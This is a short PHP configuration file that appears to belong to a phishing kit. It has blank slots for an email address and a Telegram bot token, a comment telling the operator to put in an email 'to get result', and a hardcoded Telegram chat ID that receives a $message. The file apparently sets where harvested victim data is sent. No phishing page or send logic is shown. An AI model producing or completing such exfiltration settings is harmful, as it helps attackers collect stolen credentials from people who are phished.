<?php
    // PUut hire your email to get result
    $MyEmail = '';

    // Token of Telegram
    $token = "";

    //DATA of Telegram
    $data = [
            'text' => $message,
            'chat_id' => '-4031200511'
        ];
?>